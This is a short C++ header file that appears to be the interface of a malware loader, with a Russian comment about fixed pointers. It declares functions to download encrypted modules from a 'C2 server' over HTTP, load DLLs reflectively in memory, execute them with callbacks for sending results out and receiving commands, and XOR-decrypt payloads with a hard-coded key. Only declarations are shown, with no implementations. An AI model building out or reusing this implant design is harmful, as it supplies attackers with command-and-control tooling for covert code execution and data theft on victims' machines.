// Core/loader.h — FIXED INTERFACE
#pragma once
#include <windows.h>
#include <vector>
#include <string>

// ✅ ИСПРАВЛЕНО: Указатели (*), правильное имя функции и типы аргументов
struct ModuleAPI {
    void (*send_result)(const unsigned char* data, unsigned long long len);
    void (*log)(const char* msg);
    const char* (*get_command)(const char* key); 
};

// Download encrypted module from C2 server via HTTP
bool download_module(const std::string& name, std::vector<uint8_t>& out_data);

// Reflective DLL loader
bool load_reflective_dll(const std::vector<uint8_t>& dll_data, void*& module_base);

// Execute module
bool execute_module(void* module_base, const ModuleAPI& api);

// XOR decrypt
void xor_decrypt(std::vector<uint8_t>& data, uint8_t key = 0xAA);